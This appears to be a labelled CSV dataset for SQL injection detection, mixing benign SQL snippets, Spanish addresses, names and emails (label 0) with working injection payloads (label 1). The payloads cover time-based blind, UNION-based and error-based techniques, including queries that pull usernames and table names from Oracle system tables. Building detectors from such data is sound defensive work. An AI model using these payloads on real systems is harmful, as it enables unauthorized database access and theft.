Query,Label
c/ arco de veronicas s/n 4e,0
SELECT Count ( * )  AS studying,0
carbajosa de la sagrada,0
SELECT * FROM useful WHERE immediately = 'series'  AND City = 'problem',0
"  SELECT crossID AS ID, nothing AS represent FROM which",0
mosegui bofill,0
"  SELECT Orders.thusrID, Employees.yet, Employees.table FROM OrdersRIGHT JOIN Employees ON Orders.EmployeeID  =  Employees.coverID ORDER BY Orders.deadID",0
1'   )    )     )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (     (  'ljhc'  =  'ljhc,1
"1""  )   as lkzz where 3565  =  3565 and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )  --",1
"lugar higuera canaria, 169",0
guilas,0
" SELECT * FROM adult ORDER BY tool ASC, bound DESC",0
"1  )   as iupg where 2861  =  2861 or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'rspz'  =  'rspz",1
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  9481  =  9481",1
" SELECT column_name ( s )  FROM pot,spent",0
SELECT more ( s )  FROM bread UNION ALL,0
DELETE FROM compare WHERE surprise = 'enemy',0
31410,0
"-9353"" where 4607  =  4607 union all select 4607,4607,4607,4607,4607,4607#",1
elois,0
casasnova vadal,0
SELECT TOP 3 * FROM article WHERE expression = 'alphabet',0
"  SELECT * FROM potatoes WHERE loose IN  ( 'dull', 'sides', 'tea' )  ",0
SELECT * FROM accident  WHERE chair NOT LIKE '[yes]%',0
"  SELECT copperID AS ID, thee AS connected FROM up",0
SELECT * FROM orbit WHERE popular = 'not' LIMIT 3,0
"1'   )    )    as orvy where 7270  =  7270 union all select null,null,null,null,null,null,null,null#",1
credido poma,0
valcarcel,0
1 where 4091  =  4091,1
talens zumalacrregui,0
DELETE FROM worker,0
SELECT AVG ( hurry ) FROM name SELECT SUM ( phrase ) ,0
1   )    )    as prxq where 4600  =  4600,1
"  SELECT ring,amount,interior FROM sleep LEFT JOIN Orders ON size.caughtID =  sharp.damage ORDER BY damage.shape",0
SELECT * FROM hold WHERE pass BETWEEN '1996-07-01' AND '1996-07-31',0
declare @q nvarchar   (  200  )   select @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
"INSERT INTO open ( recent, somehow, forth, fighting, roll, missing )  VALUES  ( 'age', 'pool'. success', 'waste', 'tip', 'satisfied', 'morning' )  ",0
-6947'   )    )    as qqjp where 6700  =  6700 union all select 6700#,1
perales del alfambra,0
SELECT * FROM gate FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM direct,0
1  )   where 5944  =  5944 and   (  4446  =  8843  )  *8843--,1
"1""  )   where 2215  =  2215 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )  --",1
SELECT AVG ( vowel ) FROM trade SELECT SUM ( plates ) ,0
tahull garola,0
marven,0
gabby,0
" SELECT * FROM radio ORDER BY wind ASC, sang DESC",0
"-2745'  )   or elt  (  1032  =  1032,3623  )   and   (  'vfxq'  =  'vfxq",1
apretn,0
4945,0
SELECT LOWER ( CustomerName )  AS LowercaseCustomerName FROM Customers;,0
SELECT TOP 3 * FROM caught SELECT * FROM pretty 3SELECT * FROM beneath,0
SELECT COUNT ( evening ) FROM ask,0
1%'  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
eglevsky-dux@tacticlinks.ch,0
SELECT * FROM recognize WHERE total = 'double'  AND  ( than = 'flow' OR tribe = 'beginning' ) ,0
1'   )    )     )   or sleep  (  5  )   and    (    (     (  'wuwv'  =  'wuwv,1
SELECT * FROM wp_posts LEFT JOIN wp_postmeta ON  (  wp_posts.ID  =  wp_postmeta.post_id  )  WHERE  ( post_type  =  'page' AND post_status  =  'publish' )  AND wp_postmeta.meta_key  =  '_wp_page_template' AND wp_postmeta.meta_value  =  'template/reset_password.php' ORDER BY wp_posts.post_title ASC,0
SELECT boat ( s ) FROM tribe INNER JOIN,0
SELECT * FROM fill  WHERE meat = rock,0
"select sleep  (  5  )   and    (    (     (  ""wucy"" like ""wucy",1
doroteya,0
SELECT AVG ( wood ) FROM term SELECT SUM ( smile ) ,0
"1' in boolean mode  )   union all select null,null,null,null,null,null,null,null,null,null--",1
"1   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  9255  =  9255",1
"1""   )    )    as krro where 1050  =  1050 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  --",1
"  SELECT LTRIM ( ""     SQL Tutorial"" )  AS LeftTrimmedString; ",0
" select * from users where id  =  '1' union select ""?""_,version  (    )   -- 1'",1
SELECT * FROM main ORDER BY nearby,0
SELECT COUNT ( sent )  FROM closely,0
DELETE FROM today,0
5632,0
"1  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )    and   (  2160  =  2160",1
"1%""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",1
1' in boolean mode  )   and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  #,1
SELECT * FROM excitement 3 SELECT * FROM level,0
dalenna,0
SELECT number FROM may,0
SELECT MIN ( purple )  AS collect FROM luck,0
1 where 4153  =  4153 and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  --,1
5.12832E+15,0
cecile,0
3sc8r4a8anada,0
"macario, 87,",0
" SELECT column_name ( s )  FROM plain,amount",0
r92e1*56e,0
29360,0
"    SELECT column1, column2,...     FROM existing_table_name     WHERE ....; CREATE TABLE TestTable AS ",0
SELECT * FROM knew WHERE smooth = 'track' FETCH FIRST 3 ROWS ONLY,0
"1""   )    )    as tfjh where 1134  =  1134 and 8635  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"SELECT post_id, meta_key, meta_value FROM wp_postmeta WHERE post_id IN  ( 175 )  ORDER BY meta_id ASC",0
"c/ belgica, 69 2?d",0
1 where 4787  =  4787,1
calle horreo 85 10?d,0
-8684' where 9820  =  9820 or 6844  =  5105,1
SELECT * FROM belong WHERE lucky BETWEEN 'second' AND 'gone',0
"1,  (  select   (  case when   (  5154  =  5154  )   then 1 else 5154*  (  select 5154 from master..sysdatabases  )   end   )    )   ",1
"1%""  )   and 9198  =  9198--",1
"1  )   as cjmt where 4839  =  4839 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  --",1
junquera,0
carretera rubi 106,0
"-3649""   )    )    as eydu where 3220  =  3220 or elt  (  8705  =  1510,1510  )  --",1
SELECT * FROM gone WHERE automobile = 'smaller' LIMIT 3,0
"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",1
"1  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
"-9845""  )   as xpis where 1936  =  1936 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1
SELECT TOP 3 * FROM health WHERE somewhere = 'coal' SELECT * FROM fell,0
huyente,0
"1%'  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
7118,0
1 where 4985  =  4985 order by 1#,1
"-1844""   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  ""abdw"" like ""abdw",1
SELECT * FROM to WHERE dull BETWEEN '1996-07-01' AND '1996-07-31',0
"1'  )   as dajk where 1452  =  1452 procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1
SELECT * FROM indicate WHERE NOT space = 'noon'  AND NOT log = 'dear',0
"1'  )   and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and   (  'wdeu' like 'wdeu",1
SELECT * FROM pitch ORDER BY row,0
SELECT * FROM form WHERE people  BETWEEN 10 AND 20,0
end and    (    (     (  'gqhc'  =  'gqhc,1
"1'   )    )    and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   'wzrj'  =  'wzrj",1
"1  )   as drbw where 2380  =  2380 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1
-6757'   )    )     )   or 4524  =  3696,1
SELECT * FROM Customers ORDER BY CustomerName;,0
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  table_name  )   FROM   (  SELECT DISTINCT  (  table_name  )  , ROWNUM AS LIMIT FROM sys.all_tables  )   WHERE LIMIT  =  7   )    )    AND 'i'  =  'i",1
"1'+  (  select 'tzyz' where 4912  =  4912 or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1 and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )  # dwxl",1
"-5622"" where 7970  =  7970 union all select 7970,7970,7970,7970,7970--",1
SELECT * FROM divide WHERE went = 'selection' LIMIT 3,0
DELETE FROM port WHERE just = 'one',0
-3960' or 9323  =  9323#,1
SELECT * FROM having 3,0
"iif  (  9190  =  5059,1,1/0  )  ",1
SELECT COUNT ( against ) FROM hang,0
SELECT * FROM such WHERE from = 'wife',0
6.52922E+15,0
batllori budi,0
"  SELECT here AS morning, every AS [against]  FROM aboard",0
SELECT * FROM clay WHERE usual IN  ( SELECT circle FROM various ) ,0
antonio juez 67 3?a,0
"1' in boolean mode  )   and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   #",1
" SELECT * FROM though ORDER BY good ASC, lips DESC",0
&apos; OR,1
"-6122""  )   union all select 6578,6578--",1
SELECT sail ( s )  FROM mouse UNION ALL,0
" SELECT * FROM heart ORDER BY lucky ASC, comfortable DESC",0
SELECT TOP 3 * FROM just WHERE doll = 'adventure' SELECT * FROM try,0
"1'   )    )    as lrnh where 8569  =  8569 union all select null,null,null,null,null--",1
1%'  )   and 6240  =    (  'qqpjq'||  (  select case 6240 when 6240 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )   and   (  '%'  =  ',1
7548,0
"-7142'   )    )    union all select 5083,5083,5083,5083#",1
SELECT * FROM zulu 3 SELECT * FROM child,0
1' where 1045  =  1045 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,1
SELECT * FROM move WHERE religious = 'lost' FETCH FIRST 3 ROWS ONLY,0
kiyohara,0
1  )   rlike   (  select   (  case when   (  5477  =  7492  )   then 1 else 0x28 end   )    )    and   (  4427  =  4427,1
x' AND members.email IS NULL; --,1
SELECT * FROM distance  WHERE former NOT LIKE '[attempt]%',0
"1  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
SELECT * FROM guard WHERE NOT character = 'influence'  AND NOT egg = 'something',0
1.34688E+15,0
SELECT lion ( s )  FROM list UNION,0
SELECT COUNT ( seen ) FROM play,0
lavada,0
select   (  case when   (  9318  =  7198  )   then 9318 else 9318*  (  select 9318 from information_schema.character_sets  )   end  )  #,1
"  SELECT * FROM bone WHERE ever NOT IN  ( 'planning', 'watch', 'label' )  ",0
"  SELECT * FROM exactly WHERE there IN  ( 'individual', 'neighbor', 'report' )  ",0
1'   )    )     )   and 6991  =  5579,1
"1"" and 6637  =  2321",1
duran manero,0
desmerecer,0
1   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,1
"-5148""   )    )    or 5310  =  8229",1
96399738e,0
SELECT * FROM arrangement FETCH FIRST 50 PERCENT ROWS ONLY,0
"-9764' where 1266  =  1266 or elt  (  4069  =  6162,6162  )  --",1
"-4807' where 3232  =  3232 or make_set  (  6599  =  5179,5179  )  --",1
"1  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and   (  8929  =  8929",1
"1' where 2373  =  2373 union all select null,null#",1
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  '%'  =  '",1
SELECT * FROM mysterious WHERE silver BETWEEN part09/01/1996water AND build15/31/1996once,0
"   SELECT grain,summer,nearer,brother,sweet     (  (  iron JOIN middle ON slow.occur =  repeat.truck )   INNER JOIN brushON Orders.free =  aside.costID ) ",0
6.24331E+15,0
SELECT * FROM corn WHERE where = 'alive'  OR cow = 'at',0
yu-chian,0
SELECT * FROM ill WHERE fox BETWEEN through09/01/1996damage AND trail15/31/1996some,0
"1%""   )    )     )   and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
 union select,1
pettinge,0
"1'  )   as tygi where 9891  =  9891 and row  (  6237,7469  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 5192 union select 3785 union select 3931 union select 7158  )  a group by x  )  --",1
"iif  (  1305  =  5656,1,1/0  )  ",1
coppin@sexl.no,0
"  SELECT office,creature,understanding FROM let LEFT JOIN Orders ON whose.becomeID =  engine.late ORDER BY that.yard",0
SELECT * FROM judge WHERE energy = 'toy' FETCH FIRST 3 ROWS ONLY,0
31560,0
SELECT * FROM laid WHERE pilot BETWEEN '1996-07-01' AND '1996-07-31',0
"   SELECT share, spider, plates FROM easy WHERE making  IS NULL",0
DELETE FROM behavior WHERE brain = 'unhappy',0
"1%""   )    )    and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   ""%""  =  """,1
gherardo,0
SELECT COUNT ( term )  FROM scared,0
fraccionario,0
DELETE FROM growth,0
cuz,0
"1'+  (  select sxco where 1623  =  1623 union all select null,null--",1
SELECT * FROM pay WHERE attention = 'sheep',0
"1',  (  select   (  case when   (  5433  =  5433  )   then 1 else cast  (  1 as int  )  /  (  select 0 from dual  )   end  )   from dual  )  ",1
SELECT Count ( * )  AS ourselves,0
 ( SELECT column_name FROM table_name WHERE condition  ) ;,0
SELECT * FROM task FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM house,0
-3044'  )   or 4999  =  3051#,1
"select like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  6051  =  6051",1
"1 or   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
0ehusa2,0
"1""  )   as hhxx where 3372  =  3372 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1
FROM  ( SELECT DISTINCT massage FROM fact ) ,0
1   )    )    order by 1--,1
69441548v,0
SELECT account FROM come UNION ALL SELECT expect FROM like ORDER BY barn,0
SELECT * FROM bottle WHERE next BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM planned,0
ntpadmin,0
roe,0
"1%'   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  '%'  =  '",1
SELECT TOP 50 PERCENT * FROM flies,0
1'+  (  select 'xpby' where 2724  =  2724,1
"fundidores, 179,",0
de lagarza delacerda,0
SELECT * FROM mixture  WHERE opportunity NOT LIKE '[mother]%',0
1'  )   as fksm where 9714  =  9714,1
"paso de la soledad, 130 10?f",0
mediona,0
-2483' where 1327  =  1327 union all select 1327#,1
8.76216E+15,0
"  SELECT suitID AS ID, nervous AS store FROM crop",0
SELECT TOP 3 * FROM tropical SELECT * FROM settlers 3SELECT * FROM hide,0
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM terrible FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0
patenaud,0
"-3130  )   union all select 1741,1741,1741,1741,1741,1741,1741,1741#",1
SELECT TOP 3 * FROM height WHERE journey = 'would' SELECT * FROM way,0
"-7568""   )    )     )   or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  ""jxge"" like ""jxge",1
-4313%'  )   or 6872  =  6872 and   (  '%'  =  ',1
SELECT tea ( s ) FROM improve INNER JOIN,0
SELECT * FROM most ORDER BY people,0
SELECT * FROM enter WHERE shorter LIKE '%my%',0
2969,0
SELECT until FROM nobody,0
hervs bediaga,0
"   SELECT shut, brought, flyFROM gravity WHERE floating  IS NOT NULL",0
SELECT * FROM even WHERE enjoy = 'frighten',0
SELECT AVG ( object ) FROM beginning SELECT SUM ( pick ) ,0
SELECT AVG ( easier ) FROM story,0
"1'||  (  select 'jzwq' where 3289  =  3289 union all select null,null,null,null,null,null,null#",1
"admin""  )   or ""1""  =  ""1""--",1
DELETE FROM whatever,0
SELECT TOP 3 * FROM nearer SELECT * FROM visitor 3SELECT * FROM purple,0
calle juan de sevilla 102 3c,0
SELECT outer ( s )  FROM dog LEFT JOIN,0
"  UPDATE success SET without =  'question', City =  'raw' WHERE swept =  further",0
SELECT * FROM  ( SELECT basic FROM ever ) ,0
"1'+  (  select 'nzgq' where 7230  =  7230 and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
tornadizos de vila,0
"1 or benchmark  (  10000000,MD5  (  1   )    )   #",1
cr48e24n,0
"1' in boolean mode  )   and elt  (  9630  =  4765,4765  )  #",1
SELECT AVG ( camera )  FROM apart  SELECT SUM ( thick ) ,0
lagunaseca,0
"1 where 7642  =  7642 or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )  --",1
venfica,0
castrillo de la valduerna,0
"   SELECT COUNT ( paid ) , cent FROM musical BY my",0
"  SELECT TIMEDIFF ( ""2017-06-25 13:10:11"", ""2017-06-15 13:10:10"" ) ;",0
SELECT * FROM particularly WHERE girl NOT LIKE 'letter%',0
"SELECT * FROM sheet WHERE stems BETWEEN ""watch"" AND    ""climb""",0
SELECT COUNT ( DISTINCT flat )  FROM exclaimed,0
SELECT COUNT ( adultID ) FROM visitor,0
SELECT * FROM crack FETCH FIRST 50 PERCENT ROWS ONLY,0
5537,0
SELECT saved FROM coffee UNION ALL SELECT energy FROM closely ORDER BY consist,0
"   SELECT move, face, telephoneFROM how WHERE model  IS NOT NULL",0
1'  )   where 3588  =  3588,1
"   SELECT Employees.occur, COUNT ( Orders.sentenceID )  AS deskFROM    ( OrdersINNER JOIN swimming ON Orders.balloonID  =  Employees.attackID ) ",0
1' in boolean mode  ) ,1
c6he5era,0
"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   'nczi'  =  'nczi",1
1'   )    )     )   and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and    (    (     (  'jzpb'  =  'jzpb,1
crabe,0
jones_callas1@copiar.com.travel,0
"call regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  'gtcb'  =  'gtcb",1
SELECT various ( s )  FROM article LEFT JOIN,0
"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3-- ampw",1
488u7ra,0
1'+  (  select 'jtvq' where 8288  =  8288 and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #,1
egido s/n,0
SELECT movement FROM fuel UNION SELECT boat FROM wool ORDER BY positive,0
" SELECT OrderID, Quantity, IF ( Quantity>10, ""MORE"", ""LESS"" )  FROM  OrderDetails;",0
16727733v,0
SELECT TOP 3 * FROM reach WHERE mood = 'crop',0
"-7491""  )   as cnrn where 3635  =  3635 order by 1#",1
52943030c,0
1%' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  ',1
1 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,1
SELECT * FROM if 3 SELECT * FROM tropical,0
"de los cazadores, 196, 1-b",0
SELECT * FROM into WHERE feet = 'ice'  OR chosen = 'skin',0
SELECT * FROM railroad WHERE city = 'pencil' FETCH FIRST 3 ROWS ONLY,0
"1  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  1185  =  1185",1
-5286' or 6783  =  1233,1
SELECT symbol FROM variety UNION SELECT repeat FROM make ORDER BY travel,0
SELECT * FROM goose FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM policeman,0
"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",1
" AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  USERNAME  )   FROM   (  SELECT DISTINCT  (  USERNAME  )  , ROWNUM AS LIMIT FROM SYS.ALL_USERS  )   WHERE LIMIT  =  8   )    )    AND 'i'  =  'i",1
SELECT DISTINCT river FROM she,0
SELECT * FROM with ORDER BY science,0
"   SELECT pick,peace,available,seems,above     (  (  wing JOIN younger ON wrapped.on =  doubt.tobacco )   INNER JOIN influenceON Orders.sit =  highway.inID ) ",0
"1%'   )    )    and 2716  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
" select * from users where id  =  '1'<@.. union select 1,version  (    )   -- 1'",1
SELECT * FROM  ( SELECT like FROM simplest ) ,0
SELECT * FROM rope,0
1'  )   where 7252  =  7252,1
-9311   )    )    or   (  5065  =  2572  )  *2572 and    (    (   1199  =  1199,1
SELECT return ( s FROM muscle RIGHT JOIN,0
1' where 9544  =  9544,1
SELECT AVG ( Price ) FROM telephone,0
1' and 3715 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  3715  =  3715  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and 'psdl' like 'psdl,1
"  SELECT soilID AS ID, muscle AS many FROM band",0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1
c,1
"1' in boolean mode  )   or elt  (  6272  =  6272,sleep  (  5   )    )   #",1
"-2783' where 1494  =  1494 union all select 1494,1494,1494,1494,1494,1494--",1
"1""  )   and make_set  (  4553  =  8132,8132  )   and   (  ""pfci"" like ""pfci",1
"1""  )   as iwri where 4921  =  4921 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  --",1
SELECT nuts ( s ) FROM else INNER JOIN,0
SELECT AVG ( no ) FROM cabin SELECT SUM ( felt ) ,0
select case when 1892  =  3646 then 1 else null end--,1
SELECT * FROM inch WHERE original BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT * FROM pencil WHERE newspaper LIKE '%anyone%',0
-8301'   )    )     )   or   (  5708  =  5268  )  *5268 and    (    (     (  'hkha'  =  'hkha,1
encuar,0
gierasch.casini@goovitae.cu,0
"1"" procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",1
SELECT * FROM different WHERE herd  BETWEEN 10 AND 20,0
a' --,1
 or '1'  =  '1,1
"1%"" or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and ""%""  =  """,1
1' where 1770  =  1770,1
"1"" union all select null,null,null,null,null,null--",1
"1%""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""%""  =  """,1
